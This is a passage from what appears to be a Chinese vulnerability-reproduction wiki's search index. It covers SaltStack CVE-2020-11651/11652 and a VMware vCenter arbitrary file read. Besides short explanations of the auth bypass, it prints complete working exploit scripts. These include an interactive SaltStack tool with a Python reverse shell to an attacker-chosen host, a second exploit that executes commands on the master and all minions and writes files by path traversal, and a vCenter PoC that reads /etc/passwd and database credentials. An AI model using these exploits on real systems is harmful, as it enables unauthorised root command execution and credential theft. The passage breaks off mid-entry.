11652"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/#saltstack-\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e-cve-2020-1165111652","text":"","title":"Saltstack \u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e CVE-2020-11651/11652"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/#\u6f0f\u6d1e\u63cf\u8ff0","text":"SaltStack \u662f\u57fa\u4e8e Python \u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\u3002\u56fd\u5916\u67d0\u5b89\u5168\u56e2\u961f\u62ab\u9732\u4e86 SaltStack \u5b58\u5728\u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\uff08CVE-2020-11651\uff09\u548c\u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\uff08CVE-2020-11652\uff09\u3002 \u5728 CVE-2020-11651 \u8ba4\u8bc1\u7ed5\u8fc7\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u4ee5\u7ed5\u8fc7 Salt Master \u7684\u9a8c\u8bc1\u903b\u8f91\uff0c\u8c03\u7528\u76f8\u5173\u672a\u6388\u6743\u51fd\u6570\u529f\u80fd\uff0c\u4ece\u800c\u53ef\u4ee5\u9020\u6210\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u3002 \u5728 CVE-2020-11652 \u76ee\u5f55\u904d\u5386\u6f0f\u6d1e\u4e2d\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u6076\u610f\u8bf7\u6c42\uff0c\u53ef\u4ee5\u8bfb\u53d6\u3001\u5199\u5165\u670d\u52a1\u5668\u4e0a\u4efb\u610f\u6587\u4ef6\u3002","title":"\u6f0f\u6d1e\u63cf\u8ff0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/#\u6f0f\u6d1e\u5f71\u54cd","text":"[!NOTE] SaltStack Version < 2019.2.4 SaltStack Version < 3000.2","title":"\u6f0f\u6d1e\u5f71\u54cd"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/#\u73af\u5883\u642d\u5efa","text":"[!NOTE] git clone https://github.com/vulhub/vulhub.git cd vulhub/saltstack/CVE-2020-11652 docker-compose up -d","title":"\u73af\u5883\u642d\u5efa"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/#\u6f0f\u6d1e\u590d\u73b0","text":"salt-master\u666e\u904d\u4f7f\u7528\u8fd9\u4e24\u884c\u4ee3\u7801\u8fdb\u884c\u8ba4\u8bc1\uff0c\u5176\u4e2d clear_load \u662f\u53ef\u63a7\u8f93\u5165\u70b9\u3002 auth_type, err_name, key, sensitive_load_keys = self._prep_auth_info(clear_load) auth_check = self.loadauth.check_authentication(clear_load, auth_type, key=key) _prep_auth_info \u9996\u5148\u4f1a\u8bc6\u522b clear_load \u8f93\u5165\u7684\u5b57\u6bb5\u5e76\u9009\u7528\u5176\u4e2d\u4e4b\u4e00\u4f5c\u4e3a\u8ba4\u8bc1\u65b9\u5f0f\uff0c\u7136\u540e\u4f20\u53c2\u5230 check_authentication \u65b9\u6cd5\u68c0\u9a8c\u8ba4\u8bc1\u662f\u5426\u6709\u6548\u3002 \u5728\u7b2c\u4e09\u79cd\u8ba4\u8bc1\u65b9\u5f0f auth_type=='user' \u4e2d\uff0c\u4f1a\u7531 _prep_auth_info \u83b7\u53d6\u5230\u7cfb\u7edfopt\u7684key\uff0c\u4f20\u9012\u5230 check_authentication \u4e2d\u548cAPI\u53c2\u6570\u4e2d\u643a\u5e26\u7684key\u8fdb\u884c == \u6bd4\u5bf9\u3002 \u7406\u8bba\u4e0a _prep_auth_info \u662f\u4e0d\u53ef\u88ab\u5916\u90e8\u8c03\u7528\u7684\uff0c\u6f0f\u6d1e\u6210\u56e0\u5373\u662f\u653b\u51fb\u8005\u901a\u8fc7\u533f\u540dAPI\u76f4\u63a5\u8c03\u7528 _prep_auth_info \u65b9\u6cd5\uff0c\u5728\u56de\u663e\u4e2d\u62ff\u5230 self.key \uff0c\u5e76\u5728\u540e\u7eed\u7684\u8bf7\u6c42\u4e2d\u4f7f\u7528\u83b7\u53d6\u5230\u7684key\u8fc7\u9a8c\u8bc1\uff0c\u4ee5root\u6743\u9650\u6267\u884c\u9ad8\u5371\u6307\u4ee4\u3002 Mworker daemon\u8fdb\u7a0b\u5904\u7406API\u8bf7\u6c42\uff1a class MWorker ( salt . utils . process . SignalHandlingProcess ): \"\"\" The worker multiprocess instance to manage the backend operations for the salt master. \"\"\" \u5176\u4e2d _handle_clear & _handle_aes \u51fd\u6570\u5206\u522b\u5904\u7406\u660e\u6587\u548c\u52a0\u5bc6\u6307\u4ee4\uff1a \u5728\u8fd9\u91cc\uff0c self._clear_funcs \u662f class ClearFuncs \u7684\u5b9e\u4f8b\uff0c\u5728\u8fd9\u91ccAPI\u8bbf\u95ee\u8005\u53ef\u4ee5\u65e0\u8ba4\u8bc1\u8c03\u7528\u4efb\u610f\u7684\u7c7b\u51fd\u6570\u3002 class ClearFuncs ( TransportMethods ): \"\"\" Set up functions that are safe to execute when commands sent to the master without encryption and authentication \"\"\" ClearFuncs._prep_auth_info() \u5c06self.key\u8fd4\u56de\u7ed9API\u9020\u6210\u6cc4\u9732\u3002\u653b\u51fb\u8005\u53ef\u5148\u901a\u8fc7\u8fd9\u4e00\u65b9\u6cd5\u62ff\u5230key\uff0c\u7136\u540e\u901a\u8fc7\u8ba4\u8bc1\u63a5\u53e3\u4e0b\u53d1shell\u6307\u4ee4\u3002 \u4e4b\u524d\u5b58\u5728\u6f0f\u6d1e\u7684\u4ee3\u7801\u4e2d\u4ec5\u8fc7\u6ee4\u6389 __ \u5f00\u5934\u7684private\u65b9\u6cd5\uff0c\u5bfc\u81f4 _prep_auth_info \u6cc4\u9732\uff0cpatch\u4e2d\u5bf9clearfuncs\u548caesfuncs\u4e24\u4e2a\u7c7b\u6dfb\u52a0\u4e86expose\u767d\u540d\u5355\u8fc7\u6ee4\uff1a \u8fd9\u91cc\u4f7f\u7528 POC \u6765\u590d\u7ebf \u4e0b\u8f7d\u5730\u5740: https://github.com/jasperla/CVE-2020-11651-poc \u8bfb\u53d6\u6587\u4ef6 /etc/passwd \u53cd\u5f39shell\uff08\u8fd9\u91cc\u4f7f\u7528\u53e6\u4e00\u4e2aPOC\uff09 \u4e0b\u8f7d\u5730\u5740: https://github.com/heikanet/CVE-2020-11651-CVE-2020-11652-EXP/blob/master/CVE-2020-11651.py","title":"\u6f0f\u6d1e\u590d\u73b0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/#\u6f0f\u6d1e\u5229\u7528poc","text":"\u4e0b\u8f7d\u5730\u5740 # BASE https://github.com/bravery9/SaltStack-Exp # \u5fae\u4fe1\u516c\u4f17\u53f7\uff1a\u53f0\u4e0b\u8a00\u4e66 # -*- coding:utf-8 -*- - from __future__ import absolute_import , print_function , unicode_literals import argparse import os import sys import datetime import salt import salt.version import salt.transport.client import salt.exceptions DEBUG = False def init_minion ( master_ip , master_port ): minion_config = { 'transport' : 'zeromq' , 'pki_dir' : '/tmp' , 'id' : 'root' , 'log_level' : 'debug' , 'master_ip' : master_ip , 'master_port' : master_port , 'auth_timeout' : 5 , 'auth_tries' : 1 , 'master_uri' : 'tcp:// {0} : {1} ' . format ( master_ip , master_port ) } return salt . transport . client . ReqChannel . factory ( minion_config , crypt = 'clear' ) def check_salt_version (): print ( \"[+] Salt \u7248\u672c: {} \" . format ( salt . version . __version__ )) vi = salt . version . __version_info__ if ( vi < ( 2019 , 2 , 4 ) or ( 3000 ,) <= vi < ( 3000 , 2 )): return True else : return False def check_connection ( master_ip , master_port , channel ): print ( \"[+] Checking salt-master ( {} : {} ) status... \" . format ( master_ip , master_port ), end = '' ) sys . stdout . flush () try : channel . send ({ 'cmd' : 'ping' }, timeout = 2 ) print ( ' \\033 [1;32m\u53ef\u4ee5\u8fde\u63a5 \\033 [0m' ) except salt . exceptions . SaltReqTimeoutError : print ( \" \\033 [1;31m\u65e0\u6cd5\u8fde\u63a5 \\033 [0m\" ) sys . exit ( 1 ) def check_CVE_2020_11651 ( channel ): sys . stdout . flush () # try to evil try : rets = channel . send ({ 'cmd' : '_prep_auth_info' }, timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \" \\033 [1;32m\u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) except : print ( \" \\033 [1;32m\u672a\u77e5\u9519\u8bef \\033 [0m\" ) raise else : pass finally : if rets : root_key = rets [ 2 ][ 'root' ] print ( \" \\033 [1;31m\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) return root_key return None def pwn_read_file ( channel , root_key , path , master_ip ): # print(\"[+] Attemping to read {} from {}\".format(path, master_ip)) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.read' , 'path' : path , 'saltenv' : 'base' , } rets = channel . send ( msg , timeout = 3 ) print ( rets [ 'data' ][ 'return' ][ 0 ][ path ]) def pwn_getshell ( channel , root_key , LHOST , LPORT ): msg = { \"key\" : root_key , \"cmd\" : \"runner\" , 'fun' : 'salt.cmd' , \"kwarg\" : { \"fun\" : \"cmd.exec_code\" , \"lang\" : \"python3\" , \"code\" : \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(( \\\" {} \\\" , {} ));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([ \\\" /bin/bash \\\" , \\\" -i \\\" ]);\" . format ( LHOST , LPORT ) }, 'jid' : '20200504042611133934' , 'user' : 'sudo_user' , '_stamp' : '2020-05-04T04:26:13.609688' } try : response = channel . send ( msg , timeout = 3 ) print ( \"Got response for attempting master shell: \" + str ( response ) + \". Looks promising!\" ) return True except : print ( \"something failed\" ) return False def pwn_exec ( channel , root_key , exec_cmd , master_or_minions ): if master_or_minions == \"master\" : msg = { \"key\" : root_key , \"cmd\" : \"runner\" , 'fun' : 'salt.cmd' , \"kwarg\" : { \"fun\" : \"cmd.exec_code\" , \"lang\" : \"python3\" , \"code\" : \"import subprocess;subprocess.call(' {} ',shell=True)\" . format ( exec_cmd ) }, 'jid' : '20200504042611133934' , 'user' : 'sudo_user' , '_stamp' : '2020-05-04T04:26:13.609688' } try : response = channel . send ( msg , timeout = 3 ) print ( \"Got response for attempting master shell: \" + str ( response ) + \". Looks promising!\" ) return True except : print ( \"something failed\" ) return False if master_or_minions == \"minions\" : print ( \"Sending command to all minions on master\" ) jid = \"{0:%Y%m %d %H%M%S %f }\" . format ( datetime . datetime . utcnow ()) cmd = \"/bin/sh -c ' {0} '\" . format ( exec_cmd ) msg = { 'cmd' : \"_send_pub\" , \"fun\" : \"cmd.run\" , \"arg\" : [ cmd ], \"tgt\" : \"*\" , \"ret\" : \"\" , \"tgt_type\" : \"glob\" , \"user\" : \"root\" , \"jid\" : jid } try : response = channel . send ( msg , timeout = 3 ) if response == None : return True else : return False except : return False ##################################### master_ip = input ( '\u76ee\u6807IP\uff1a' ) master_port = '4506' channel = init_minion ( master_ip , master_port ) try : root_key = check_CVE_2020_11651 ( channel ) except : pass while master_ip != '' : print ( '1.\u6d4b\u8bd5POC 2.\u8bfb\u53d6\u6587\u4ef6 3.\u6267\u884c\u547d\u4ee4(\u65e0\u56de\u663e) 4.\u53cd\u5f39shell 5.\u9000\u51fa' ) whattype = input ( '\u8bf7\u9009\u62e9\uff1a' ) if whattype == '1' : check_salt_version () # \u68c0\u67e5salt\u7248\u672c check_connection ( master_ip , master_port , channel ) # \u68c0\u67e5\u8fde\u63a5 root_key = check_CVE_2020_11651 ( channel ) # \u8bfb\u53d6root key print ( root_key ) elif whattype == '2' : path = input ( '\u8bfb\u53d6\u8def\u5f84\uff1a' ) try : pwn_read_file ( channel , root_key , path , master_ip ) # \u8bfb\u53d6\u6587\u4ef6 except : print ( '\u6587\u4ef6\u4e0d\u5b58\u5728' ) elif whattype == '3' : print ( '1.master 2.minions' ) exectype = input ( '\u9009\u62e9\u65b9\u5f0f\uff1a' ) if exectype == '1' : master_or_minions = 'master' elif exectype == '2' : master_or_minions = 'minions' exec_cmd = input ( '\u8f93\u5165\u547d\u4ee4\uff1a' ) pwn_exec ( channel , root_key , exec_cmd , master_or_minions ) # \u6267\u884c\u547d\u4ee4 elif whattype == '4' : LHOST = input ( '\u53cd\u5f39\u5230IP\uff1a' ) LPORT = input ( '\u53cd\u5f39\u7aef\u53e3\uff1a' ) pwn_getshell ( channel , root_key , LHOST , LPORT ) # \u53cd\u5f39shell elif whattype == '5' : exit () \u4e0b\u8f7d\u5730\u5740 #!/usr/bin/env python # # Exploit for CVE-2020-11651 and CVE-2020-11652 # Written by Jasper Lievisse Adriaanse (https://github.com/jasperla/CVE-2020-11651-poc) # This exploit is based on this checker script: # https://github.com/rossengeorgiev/salt-security-backports from __future__ import absolute_import , print_function , unicode_literals import argparse import datetime import os import os.path import sys import time import salt import salt.version import salt.transport.client import salt.exceptions def init_minion ( master_ip , master_port ): minion_config = { 'transport' : 'zeromq' , 'pki_dir' : '/tmp' , 'id' : 'root' , 'log_level' : 'debug' , 'master_ip' : master_ip , 'master_port' : master_port , 'auth_timeout' : 5 , 'auth_tries' : 1 , 'master_uri' : 'tcp:// {0} : {1} ' . format ( master_ip , master_port ) } return salt . transport . client . ReqChannel . factory ( minion_config , crypt = 'clear' ) # --- check funcs ---- def check_connection ( master_ip , master_port , channel ): print ( \"[+] Checking salt-master ( {} : {} ) status... \" . format ( master_ip , master_port ), end = '' ) sys . stdout . flush () # connection check try : channel . send ({ 'cmd' : 'ping' }, timeout = 2 ) except salt . exceptions . SaltReqTimeoutError : print ( \"OFFLINE\" ) sys . exit ( 1 ) else : print ( \"ONLINE\" ) def check_CVE_2020_11651 ( channel ): print ( \"[+] Checking if vulnerable to CVE-2020-11651... \" , end = '' ) sys . stdout . flush () try : rets = channel . send ({ 'cmd' : '_prep_auth_info' }, timeout = 3 ) except : print ( 'ERROR' ) return None else : pass finally : if rets : print ( 'YES' ) root_key = rets [ 2 ][ 'root' ] return root_key print ( 'NO' ) return None def check_CVE_2020_11652_read_token ( debug , channel , top_secret_file_path ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (read_token)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'cmd' : 'get_token' , 'arg' : [], 'token' : top_secret_file_path , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"YES\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) print ( \"NO\" ) def check_CVE_2020_11652_read ( debug , channel , top_secret_file_path , root_key ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (read)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.read' , 'path' : top_secret_file_path , 'saltenv' : 'base' , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"TIMEOUT\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) if rets [ 'data' ][ 'return' ]: print ( \"YES\" ) else : print ( \"NO\" ) def check_CVE_2020_11652_write1 ( debug , channel , root_key ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (write1)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.write' , 'path' : '../../../../../../../../tmp/salt_CVE_2020_11652' , 'data' : 'evil' , 'saltenv' : 'base' , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"TIMEOUT\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) pp ( rets ) if rets [ 'data' ][ 'return' ] . startswith ( 'Wrote' ): try : os . remove ( '/tmp/salt_CVE_2020_11652' ) except OSError : print ( \"Maybe?\" ) else : print ( \"YES\" ) else : print ( \"NO\" ) def check_CVE_2020_11652_write2 ( debug , channel , root_key ): print ( \"[+] Checking if vulnerable to CVE-2020-11652 (write2)... \" , end = '' ) sys . stdout . flush () # try read file msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'config.update_config' , 'file_name' : '../../../../../../../../tmp/salt_CVE_2020_11652' , 'yaml_contents' : 'evil' , 'saltenv' : 'base' , } try : rets = channel . send ( msg , timeout = 3 ) except salt . exceptions . SaltReqTimeoutError : print ( \"TIMEOUT\" ) except : print ( \"ERROR\" ) raise else : if debug : print () print ( rets ) if rets [ 'data' ][ 'return' ] . startswith ( 'Wrote' ): try : os . remove ( '/tmp/salt_CVE_2020_11652.conf' ) except OSError : print ( \"Maybe?\" ) else : print ( \"YES\" ) else : print ( \"NO\" ) def pwn_read_file ( channel , root_key , path , master_ip ): print ( \"[+] Attemping to read {} from {} \" . format ( path , master_ip )) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.read' , 'path' : path , 'saltenv' : 'base' , } rets = channel . send ( msg , timeout = 3 ) print ( rets [ 'data' ][ 'return' ][ 0 ][ path ]) def pwn_upload_file ( channel , root_key , src , dest , master_ip ): print ( \"[+] Attemping to upload {} to {} on {} \" . format ( src , dest , master_ip )) sys . stdout . flush () try : fh = open ( src , 'rb' ) payload = fh . read () fh . close () except Exception as e : print ( '[-] Failed to read {} : {} ' . format ( src , e )) return msg = { 'key' : root_key , 'cmd' : 'wheel' , 'fun' : 'file_roots.write' , 'saltenv' : 'base' , 'data' : payload , 'path' : dest , } rets = channel . send ( msg , timeout = 3 ) print ( '[ ] {} ' . format ( rets [ 'data' ][ 'return' ])) def pwn_exec ( channel , root_key , cmd , master_ip , jid ): print ( \"[+] Attemping to execute {} on {} \" . format ( cmd , master_ip )) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : 'runner' , 'fun' : 'salt.cmd' , 'saltenv' : 'base' , 'user' : 'sudo_user' , 'kwarg' : { 'fun' : 'cmd.exec_code' , 'lang' : 'python' , 'code' : \"import subprocess;subprocess.call(' {} ',shell=True)\" . format ( cmd ) }, 'jid' : jid , } try : rets = channel . send ( msg , timeout = 3 ) except Exception as e : print ( '[-] Failed to submit job' ) return if rets . get ( 'jid' ): print ( '[+] Successfully scheduled job: {} ' . format ( rets [ 'jid' ])) def pwn_exec_all ( channel , root_key , cmd , master_ip , jid ): print ( \"[+] Attemping to execute ' {} ' on all minions connected to {} \" . format ( cmd , master_ip )) sys . stdout . flush () msg = { 'key' : root_key , 'cmd' : '_send_pub' , 'fun' : 'cmd.run' , 'user' : 'root' , 'arg' : [ \"/bin/sh -c ' {} '\" . format ( cmd ) ], 'tgt' : '*' , 'tgt_type' : 'glob' , 'ret' : '' , 'jid' : jid } try : rets = channel . send ( msg , timeout = 3 ) except Exception as e : print ( '[-] Failed to submit job' ) return finally : if rets == None : print ( '[+] Successfully submitted job to all minions.' ) else : print ( '[-] Failed to submit job' ) def main (): parser = argparse . ArgumentParser ( description = 'Saltstack exploit for CVE-2020-11651 and CVE-2020-11652' ) parser . add_argument ( '--master' , '-m' , dest = 'master_ip' , default = '127.0.0.1' ) parser . add_argument ( '--port' , '-p' , dest = 'master_port' , default = '4506' ) parser . add_argument ( '--force' , '-f' , dest = 'force' , default = False , action = 'store_false' ) parser . add_argument ( '--debug' , '-d' , dest = 'debug' , default = False , action = 'store_true' ) parser . add_argument ( '--run-checks' , '-c' , dest = 'run_checks' , default = False , action = 'store_true' ) parser . add_argument ( '--read' , '-r' , dest = 'read_file' ) parser . add_argument ( '--upload-src' , dest = 'upload_src' ) parser . add_argument ( '--upload-dest' , dest = 'upload_dest' ) parser . add_argument ( '--exec' , dest = 'exec' , help = 'Run a command on the master' ) parser . add_argument ( '--exec-all' , dest = 'exec_all' , help = 'Run a command on all minions' ) args = parser . parse_args () print ( \"[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.\" ) time . sleep ( 1 ) # Both src and destination are required for uploads if ( args . upload_src and args . upload_dest is None ) or ( args . upload_dest and args . upload_src is None ): print ( '[-] Must provide both --upload-src and --upload-dest' ) sys . exit ( 1 ) channel = init_minion ( args . master_ip , args . master_port ) check_connection ( args . master_ip , args . master_port , channel ) root_key = check_CVE_2020_11651 ( channel ) if root_key : print ( '[*] root key obtained: {} ' . format ( root_key )) else : print ( '[-] Failed to find root key...aborting' ) sys . exit ( 127 ) if args . run_checks : # Assuming this check runs on the master itself, create a file with \"secret\" content # and abuse CVE-2020-11652 to read it. top_secret_file_path = '/tmp/salt_cve_teta' with salt . utils . fopen ( top_secret_file_path , 'w' ) as fd : fd . write ( \"top secret\" ) # Again, this assumes we're running this check on the master itself with salt . utils . fopen ( '/var/cache/salt/master/.root_key' ) as keyfd : root_key = keyfd . read () check_CVE_2020_11652_read_token ( debug , channel , top_secret_file_path ) check_CVE_2020_11652_read ( debug , channel , top_secret_file_path , root_key ) check_CVE_2020_11652_write1 ( debug , channel , root_key ) check_CVE_2020_11652_write2 ( debug , channel , root_key ) os . remove ( top_secret_file_path ) sys . exit ( 0 ) if args . read_file : pwn_read_file ( channel , root_key , args . read_file , args . master_ip ) if args . upload_src : if os . path . isabs ( args . upload_dest ): print ( '[-] Destination path must be relative; aborting' ) sys . exit ( 1 ) pwn_upload_file ( channel , root_key , args . upload_src , args . upload_dest , args . master_ip ) jid = '{0:%Y%m %d %H%M%S %f }' . format ( datetime . datetime . utcnow ()) if args . exec : pwn_exec ( channel , root_key , args . exec , args . master_ip , jid ) if args . exec_all : print ( \"[!] Lester, is this what you want? Hit ^C to abort.\" ) time . sleep ( 2 ) pwn_exec_all ( channel , root_key , args . exec_all , args . master_ip , jid ) if __name__ == '__main__' : main ()","title":"\u6f0f\u6d1e\u5229\u7528POC"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Saltstack/Saltstack%20%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2020-11651%2011652/#\u53c2\u8003\u6587\u7ae0","text":"https://www.cdxy.me/?p=822","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/","text":"VMware vCenter\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u63cf\u8ff0 \u00b6 VMware vCenter\u7279\u5b9a\u7248\u672c\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u901a\u8fc7\u6784\u9020\u7279\u5b9a\u7684\u8bf7\u6c42\uff0c\u53ef\u4ee5\u8bfb\u53d6\u670d\u52a1\u5668\u4e0a\u4efb\u610f\u6587\u4ef6\u3001 \u6f0f\u6d1e\u5f71\u54cd \u00b6 [!NOTE] VMware vCenter Server 6.5.0a- f \u7248\u672c FOFA \u00b6 [!NOTE] title=\"ID_VC_Welcome\" \u6f0f\u6d1e\u590d\u73b0 \u00b6 \u4f7f\u7528POC\u8bbf\u95ee\u6f0f\u6d1e\u70b9 [!NOTE] Windows\u4e3b\u673a http://xxx.xxx.xxx.xxx/eam/vib?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties [!NOTE] Linux\u4e3b\u673a https://xxx.xxx.xxx.xxx/eam/vib?id=/etc/passwd \u6f0f\u6d1e\u5229\u7528POC \u00b6 import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title (): print ( '+------------------------------------------' ) print ( '+ \\033 [34mPOC_Des: http://wiki.peiqi.tech \\033 [0m' ) print ( '+ \\033 [34mVersion: VMware vCenter\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e \\033 [0m' ) print ( '+ \\033 [36m\u4f7f\u7528\u683c\u5f0f: python3 poc.py \\033 [0m' ) print ( '+ \\033 [36mUrl >>> http://xxx.xxx.xxx.xxx \\033 [0m' ) print ( '+------------------------------------------' ) def POC_1 ( target_url ): vuln_url_windows = target_url + \"/eam/vib?id=C:\\ProgramData\\VMware \\\\ vCenterServer\\cfg \\\\ vmware-vpx \\\\ vcdb.properties\" vuln_url_linux = target_url + \"/eam/vib?id=/etc/passwd\" headers = { \"User-Agent\" : \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\" , } try : requests . packages . urllib3 . disable_warnings ( InsecureRequestWarning ) response_linux = requests . get ( url = vuln_url_linux , headers = headers , verify = False , timeout = 5 ) response_windows = requests . get ( url = vuln_url_windows , headers = headers , verify = False , timeout = 5 ) if \"password\" in response_windows . text and response_windows . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 vcdb.properties \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] Windows\u7cfb\u7edf, \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response_windows . text )) elif \"root\" in response_linux . text and response_linux . status_code == 200 : print ( \" \\033 [32m[o] \u76ee\u6807 {} \u5b58\u5728\u6f0f\u6d1e ,\u6210\u529f\u8bfb\u53d6 /etc/passwd \\033 [0m\" . format ( target_url )) print ( \" \\033 [32m[o] Linux\u7cfb\u7edf, \u54cd\u5e94\u4e3a: \\n {} \\033 [0m\" . format ( response_linux . text )) else : print ( \" \\033 [31m[x] \u4e0d\u5b58\u5728\u6f0f\u6d1e \\033 [0m\" ) sys . exit ( 0 ) except Exception as e : print ( \" \\033 [31m[x] \u8bf7\u6c42\u5931\u8d25 \\033 [0m\" , e ) if __name__ == '__main__' : title () target_url = str ( input ( \" \\033 [35mPlease input Attack Url \\n Url >>> \\033 [0m\" )) POC_1 ( target_url )","title":"VMware vCenter\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#vmware-vcenter\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e","text":"","title":"VMware vCenter\u4efb\u610f\u6587\u4ef6\u8bfb\u53d6\u6f0f\u6d1e"},{"location":"%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/VMware/VMware%20vCenter%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/#\u6f0f\u6d1e\u63cf\u8ff0","text":"VMware 